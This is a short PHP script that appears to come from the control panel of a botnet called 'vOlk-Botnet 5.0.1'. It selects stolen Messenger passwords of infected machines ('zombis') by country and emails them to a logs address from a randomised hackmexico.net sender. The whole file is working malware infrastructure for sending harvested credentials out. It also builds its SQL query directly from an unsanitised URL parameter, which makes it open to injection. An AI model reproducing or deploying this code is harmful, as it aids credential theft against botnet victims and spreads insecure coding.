<?php @session_start(); if ( !isset($_SESSION['login']) ){ header ("Location: ../../");  exit() ; }	?>
<?php 
require_once('../../includes.php'); 
require_once('../../Class/class.base.de.datos.php');
require_once("../../Configs/Pass.php");
$Messenger = $DB->Select("SELECT * FROM zombis WHERE pais='".$_GET['pais']."'");	
for($i=0; $i<count($Messenger); $i++){
	$Messengertxt .= $Messenger[$i]['pasw'] . '
' ;
}
$Ramdon = substr(md5(uniqid(rand())),0,6);
$header = SendEmail(EMAIL_LOGS,'vOlk-Botnet 5.0.1',''.$Ramdon.'@hackmexico.net','Messenger -'.$_GET['pais'].'',$Messengertxt);
echo "Mail sent successfully";
?>







